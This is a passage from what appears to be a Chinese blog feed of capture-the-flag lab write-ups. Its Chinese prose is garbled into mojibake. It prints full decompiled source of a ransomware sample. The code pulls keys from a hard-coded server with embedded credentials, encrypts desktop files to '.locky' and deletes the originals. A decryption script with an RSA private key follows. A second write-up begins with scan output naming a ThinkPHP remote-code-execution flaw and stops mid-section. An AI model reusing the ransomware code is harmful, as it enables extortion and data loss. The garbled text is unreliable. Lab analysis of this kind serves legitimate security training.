çš„æ–‡ä»¶ï¼Œä¸€çœ‹å°±æ˜¯å‹’ç´¢ç—…æ¯’ï¼Œæ¡Œé¢è¿˜æœ‰ä¸ªè¢«åŠ å¯†çš„ ScadaDB.sql.locky</p><p><img src="https://img.dkdun.cn/v1/2025/12/2508c29f1d3cacc4.png"></p><p>åœ¨ C ç›˜ä¸­æ‰¾åˆ°äº†å‹’ç´¢ç—…æ¯’ç¨‹åº Lockyou.exeï¼Œæ£€æŸ¥å‘ç°æ˜¯ C#ï¼Œæ‰¾åˆ°ä¸»è¦åŠ å¯†é€»è¾‘</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Net;<br><span class="hljs-keyword">using</span> System.Security.Cryptography;<br><span class="hljs-keyword">using</span> System.Text;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Lockyou.LockyCore</span><br>&#123;<br><span class="hljs-comment">// Token: 0x02000004 RID: 4</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AESCrypto</span><br>&#123;<br><span class="hljs-comment">// Token: 0x0600000C RID: 12 RVA: 0x00002280 File Offset: 0x00000480</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AESCrypto</span>()</span><br>&#123;<br><span class="hljs-keyword">this</span>.BACKEND_URL = <span class="hljs-string">&quot;http://39.101.170.47/&quot;</span>;<br><span class="hljs-keyword">this</span>.PRIVATE_KEY = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;privateKey&quot;</span>);<br><span class="hljs-keyword">this</span>.AES_KEY_ENC = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;encryptedAesKey&quot;</span>);<br><span class="hljs-keyword">this</span>.AES_KEY = <span class="hljs-keyword">this</span>.DecryptRSA(<span class="hljs-keyword">this</span>.AES_KEY_ENC, <span class="hljs-keyword">this</span>.PRIVATE_KEY);<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000D RID: 13 RVA: 0x000023E4 File Offset: 0x000005E4</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">GetHttpContent</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> url</span>)</span><br>&#123;<br>HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);<br>httpWebRequest.Method = <span class="hljs-string">&quot;GET&quot;</span>;<br>httpWebRequest.ContentType = <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>;<br><span class="hljs-built_in">string</span> str = Convert.ToBase64String(Encoding.ASCII.GetBytes(<span class="hljs-string">&quot;C2bAseUs2r:C@PsasR2&quot;</span>));<br>httpWebRequest.Headers[HttpRequestHeader.Authorization] = <span class="hljs-string">&quot;Basic &quot;</span> + str;<br>HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();<br><span class="hljs-built_in">string</span> result;<br><span class="hljs-keyword">using</span> (StreamReader streamReader = <span class="hljs-keyword">new</span> StreamReader(httpWebResponse.GetResponseStream()))<br>&#123;<br>result = streamReader.ReadToEnd();<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000E RID: 14 RVA: 0x00002484 File Offset: 0x00000684</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">DecryptRSA</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> encryptedData, <span class="hljs-built_in">string</span> privateKey</span>)</span><br>&#123;<br><span class="hljs-built_in">byte</span>[] result;<br><span class="hljs-keyword">using</span> (RSACryptoServiceProvider rsacryptoServiceProvider = <span class="hljs-keyword">new</span> RSACryptoServiceProvider())<br>&#123;<br>rsacryptoServiceProvider.FromXmlString(privateKey);<br><span class="hljs-built_in">byte</span>[] rgb = Convert.FromBase64String(encryptedData);<br>result = rsacryptoServiceProvider.Decrypt(rgb, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000F RID: 15 RVA: 0x000024D0 File Offset: 0x000006D0</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">EncryptFileStart</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> insureKey</span>)</span><br>&#123;<br>MD5 md = <span class="hljs-keyword">new</span> MD5CryptoServiceProvider();<br>StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-built_in">byte</span>[] array = md.ComputeHash(Encoding.Default.GetBytes(insureKey));<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; array.Length; i++)<br>&#123;<br>stringBuilder.Append(array[i].ToString(<span class="hljs-string">&quot;x2&quot;</span>));<br>&#125;<br><span class="hljs-built_in">bool</span> flag = stringBuilder.ToString() != <span class="hljs-string">&quot;7a2ca8a306260205c1cd46dad0fbd598&quot;</span>;<br><span class="hljs-built_in">int</span> result;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br>Console.WriteLine(<span class="hljs-string">&quot;Incorrect insurance key!&quot;</span>);<br>result = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">int</span> num = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">string</span> searchPattern <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>.FILE_TYPES)<br>&#123;<br><span class="hljs-built_in">string</span>[] files = Directory.GetFiles(<span class="hljs-keyword">this</span>.DESKTOP_PATH, searchPattern);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">string</span> text <span class="hljs-keyword">in</span> files)<br>&#123;<br><span class="hljs-keyword">this</span>.EncryptFile(text, text + <span class="hljs-string">&quot;.locky&quot;</span>);<br>num++;<br>&#125;<br>&#125;<br>result = num;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x06000010 RID: 16 RVA: 0x000025D0 File Offset: 0x000007D0</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">EncryptFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> inputFile, <span class="hljs-built_in">string</span> outputFile</span>)</span><br>&#123;<br><span class="hljs-keyword">using</span> (AesCryptoServiceProvider aesCryptoServiceProvider = <span class="hljs-keyword">new</span> AesCryptoServiceProvider())<br>&#123;<br>aesCryptoServiceProvider.Key = <span class="hljs-keyword">this</span>.AES_KEY;<br>aesCryptoServiceProvider.GenerateIV();<br><span class="hljs-keyword">using</span> (ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor())<br>&#123;<br><span class="hljs-keyword">using</span> (FileStream fileStream = <span class="hljs-keyword">new</span> FileStream(inputFile, FileMode.Open))<br>&#123;<br><span class="hljs-keyword">using</span> (FileStream fileStream2 = <span class="hljs-keyword">new</span> FileStream(outputFile, FileMode.Create))<br>&#123;<br><span class="hljs-keyword">using</span> (CryptoStream cryptoStream = <span class="hljs-keyword">new</span> CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write))<br>&#123;<br>fileStream2.Write(aesCryptoServiceProvider.IV, <span class="hljs-number">0</span>, aesCryptoServiceProvider.IV.Length);<br>fileStream.CopyTo(cryptoStream);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>File.Delete(inputFile);<br>&#125;<br><br><span class="hljs-comment">// Token: 0x04000007 RID: 7</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> BACKEND_URL;<br><br><span class="hljs-comment">// Token: 0x04000008 RID: 8</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> PRIVATE_KEY;<br><br><span class="hljs-comment">// Token: 0x04000009 RID: 9</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> AES_KEY_ENC;<br><br><span class="hljs-comment">// Token: 0x0400000A RID: 10</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] AES_KEY;<br><br><span class="hljs-comment">// Token: 0x0400000B RID: 11</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> DESKTOP_PATH = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);<br><br><span class="hljs-comment">// Token: 0x0400000C RID: 12</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span>[] FILE_TYPES = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[]<br>&#123;<br><span class="hljs-string">&quot;*.txt&quot;</span>,<br><span class="hljs-string">&quot;*.xlsx&quot;</span>,<br><span class="hljs-string">&quot;*.jpg&quot;</span>,<br><span class="hljs-string">&quot;*.png&quot;</span>,<br><span class="hljs-string">&quot;*.gif&quot;</span>,<br><span class="hljs-string">&quot;*.pdf&quot;</span>,<br><span class="hljs-string">&quot;*.mp4&quot;</span>,<br><span class="hljs-string">&quot;*.wav&quot;</span>,<br><span class="hljs-string">&quot;*.mp3&quot;</span>,<br><span class="hljs-string">&quot;*.bak&quot;</span>,<br><span class="hljs-string">&quot;*.docx&quot;</span>,<br><span class="hljs-string">&quot;*.pptx&quot;</span>,<br><span class="hljs-string">&quot;*.gif&quot;</span>,<br><span class="hljs-string">&quot;*.zip&quot;</span>,<br><span class="hljs-string">&quot;*.csv&quot;</span>,<br><span class="hljs-string">&quot;*.sql&quot;</span>,<br><span class="hljs-string">&quot;*.ini&quot;</span>,<br><span class="hljs-string">&quot;*.html&quot;</span>,<br><span class="hljs-string">&quot;*.php&quot;</span>,<br><span class="hljs-string">&quot;*.js&quot;</span>,<br><span class="hljs-string">&quot;*.css&quot;</span>,<br><span class="hljs-string">&quot;*.py&quot;</span>,<br><span class="hljs-string">&quot;*.cs&quot;</span>,<br><span class="hljs-string">&quot;*.cpp&quot;</span>,<br><span class="hljs-string">&quot;*.c&quot;</span><br>&#125;;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç»“åˆé™„ä»¶å†™å‡ºè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, PKCS1_v1_5<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><br>AES_KEY_ENC_B64 = <span class="hljs-string">&quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot;</span><br><br>RSA_KEY_XML = <span class="hljs-string">&quot;&quot;&quot;&lt;RSAKeyValue&gt;&lt;Modulus&gt;uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;P&gt;2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==&lt;/P&gt;&lt;Q&gt;2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==&lt;/Q&gt;&lt;DP&gt;ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==&lt;/DP&gt;&lt;DQ&gt;PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==&lt;/DQ&gt;&lt;InverseQ&gt;JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==&lt;/InverseQ&gt;&lt;D&gt;tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=&lt;/D&gt;&lt;/RSAKeyValue&gt;&quot;&quot;&quot;</span>  <span class="hljs-comment"># ä½ å‰é¢å‘çš„ XML RSA Key</span><br><br><span class="hljs-comment"># 3. åŠ å¯†æ–‡ä»¶è·¯å¾„</span><br>ENCRYPTED_FILE = <span class="hljs-string">&quot;ScadaDB.sql.locky&quot;</span><br><br><span class="hljs-comment"># 4. è§£å¯†åè¾“å‡ºè·¯å¾„</span><br>DECRYPTED_OUTPUT = <span class="hljs-string">&quot;ScadaDB.sql&quot;</span><br><span class="hljs-comment"># --------------------------------------------------</span><br><br><span class="hljs-comment"># å°† XML è½¬æ¢ä¸º RSA ç§é’¥å¯¹è±¡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_key_from_xml</span>(<span class="hljs-params">xml_str</span>):<br>    <span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br>    tree = ET.fromstring(xml_str)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">tag</span>): <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(base64.b64decode(tree.find(tag).text), <span class="hljs-string">&#x27;big&#x27;</span>)<br>    n = b64(<span class="hljs-string">&#x27;Modulus&#x27;</span>)<br>    e = b64(<span class="hljs-string">&#x27;Exponent&#x27;</span>)<br>    d = b64(<span class="hljs-string">&#x27;D&#x27;</span>)<br>    p = b64(<span class="hljs-string">&#x27;P&#x27;</span>)<br>    q = b64(<span class="hljs-string">&#x27;Q&#x27;</span>)<br>    <span class="hljs-keyword">return</span> RSA.construct((n, e, d, p, q))<br><br><span class="hljs-comment"># è§£å¯† AES Key</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes_key</span>(<span class="hljs-params">enc_b64, rsa_key</span>):<br>    cipher_rsa = PKCS1_v1_5.new(rsa_key)<br>    enc_bytes = base64.b64decode(enc_b64)<br>    <span class="hljs-comment"># Sentinel: used if padding check fails</span><br>    sentinel = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> cipher_rsa.decrypt(enc_bytes, sentinel)<br><br><span class="hljs-comment"># è§£å¯† .locky æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_locky_file</span>(<span class="hljs-params">enc_file, out_file, aes_key</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(enc_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        iv = f.read(<span class="hljs-number">16</span>)<br>        ciphertext = f.read()<br>    cipher = AES.new(aes_key, AES.MODE_CBC, iv)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># å»é™¤ PKCS#7 Padding</span><br>    pad_len = decrypted[-<span class="hljs-number">1</span>]<br>    decrypted = decrypted[:-pad_len]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(out_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è§£å¯†å®Œæˆ: <span class="hljs-subst">&#123;out_file&#125;</span>&quot;</span>)<br><br>rsa_key = rsa_key_from_xml(RSA_KEY_XML)<br>aes_key = decrypt_aes_key(AES_KEY_ENC_B64, rsa_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è§£å¯†å‡º AES å¯†é’¥: <span class="hljs-subst">&#123;aes_key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>decrypt_locky_file(ENCRYPTED_FILE, DECRYPTED_OUTPUT, aes_key)<br><br></code></pre></td></tr></table></figure><p>è§£å‡ºæ¥ä¹‹ååœ¨ sql æ–‡ä»¶ä¸­æ‰¾åˆ° flag04</p><p><img src="https://img.dkdun.cn/v1/2025/12/c6f2ffdb7bcef3b2.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">63</span>cd8cd5-<span class="hljs-number">151</span>f-<span class="hljs-number">4</span>f29-bdc7-f80312888158&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€ Heapdump å†…å­˜æ³„éœ² Shiro ååºåˆ—åŒ– æ³¨å†Œè¡¨ SAM è½¬å‚¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-Initial</title>
    <link href="/2025/07/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
    <url>/2025/07/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
    
    <content type="html"><![CDATA[<p>æ–‡ä»¶ä¸Šä¼ ã€DCSync</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -Pn -A 39.99.133.101<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 00:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 39.99.133.101<br>Host is up (0.064s latency).<br>Not shown: 986 closed tcp ports (reset)<br>PORT     STATE    SERVICE        VERSION<br>22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 f5:ca:b4:23:30:80:1d:cf:ea:13:a0:d9:56:ff:f6:84 (RSA)<br>|   256 17:84:60:d7:a9:<span class="hljs-built_in">fc</span>:e1:ec:ea:31:a3:8c:55:12:1f:85 (ECDSA)<br>|_  256 ed:73:ff:53:03:1f:b4:<span class="hljs-built_in">df</span>:14:05:8c:40:64:7d:f2:1c (ED25519)<br>42/tcp   filtered nameserver<br>80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Bootstrap Material Admin<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>135/tcp  filtered msrpc<br>139/tcp  filtered netbios-ssn<br>445/tcp  filtered microsoft-ds<br>593/tcp  filtered http-rpc-epmap<br>1025/tcp filtered NFS-or-IIS<br>1068/tcp filtered instl_bootc<br>1434/tcp filtered ms-sql-m<br>3128/tcp filtered squid-http<br>4444/tcp filtered krb524<br>5800/tcp filtered vnc-http<br>5900/tcp filtered vnc<br>Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 3.5 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 3.10 (87%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 12 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>å¼€äº†å¾ˆå¤šç«¯å£</p><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan æ‰«ä¸€ä¸‹ï¼Œthinkphp 5.0.23 ç‰ˆæœ¬ï¼Œæœ‰æ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ª rce</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">aWeb</span>\<span class="hljs-title">fscan</span>-<span class="hljs-title">main</span>&gt;.\<span class="hljs-title">fscan.exe</span> -<span class="hljs-title">h</span> 39.99.133.101</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">___</span>                              <span class="hljs-title">_</span></span><br><span class="hljs-function">  / <span class="hljs-title">_</span> \     <span class="hljs-title">___</span>  <span class="hljs-title">___</span> <span class="hljs-title">_</span> <span class="hljs-title">__</span> <span class="hljs-title">__</span> <span class="hljs-title">_</span>  <span class="hljs-title">___</span>| | <span class="hljs-title">__</span></span><br><span class="hljs-function"> / /<span class="hljs-title">_</span>\/<span class="hljs-title">____</span>/ <span class="hljs-title">__</span>|/ <span class="hljs-title">__</span>| &#x27;<span class="hljs-title">__</span>/ <span class="hljs-title">_</span>` |/ <span class="hljs-title">__</span>| |/ /</span><br><span class="hljs-function">/ /<span class="hljs-title">_</span>\\<span class="hljs-title">_____</span>\<span class="hljs-title">__</span> \ (<span class="hljs-title">__</span>| | | (<span class="hljs-title">_</span>| | (<span class="hljs-title">__</span>|   &lt;</span><br><span class="hljs-function">\<span class="hljs-title">____</span>/     |<span class="hljs-title">___</span>/\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|  \<span class="hljs-title">__</span>,<span class="hljs-title">_</span>|\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|\<span class="hljs-title">_</span>\</span><br><span class="hljs-function">                     <span class="hljs-title">fscan</span> <span class="hljs-title">version</span>: 1.8.4</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">infoscan</span></span><br><span class="hljs-function">39.99.133.101:22 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.99.133.101:80 <span class="hljs-title">open</span></span><br><span class="hljs-function">[*] <span class="hljs-title">alive</span> <span class="hljs-title">ports</span> <span class="hljs-title">len</span> <span class="hljs-title">is</span>: 2</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">vulscan</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.99.133.101      <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:5578   <span class="hljs-title">title:Bootstrap</span> <span class="hljs-title">Material</span> <span class="hljs-title">Admin</span></span><br><span class="hljs-function">[+] <span class="hljs-title">PocScan</span> <span class="hljs-title">http</span>://39.99.133.101 <span class="hljs-title">poc</span>-<span class="hljs-title">yaml</span>-<span class="hljs-title">thinkphp5023</span>-<span class="hljs-title">method</span>-<span class="hljs-title">rce</span> <span class="hljs-title">poc1</span></span><br><span class="hljs-function">å·²å®Œæˆ 2/2</span><br><span class="hljs-function">[*] æ‰«æç»“æŸ,è€—æ—¶: 55.1963091<span class="hljs-title">s</span></span><br></code></pre></td></tr></table></figure><h1 id="mysql-ææƒ"><a href="#mysql-ææƒ" class="headerlink" title="mysql ææƒ"></a>mysql ææƒ</h1><figure class="highlight 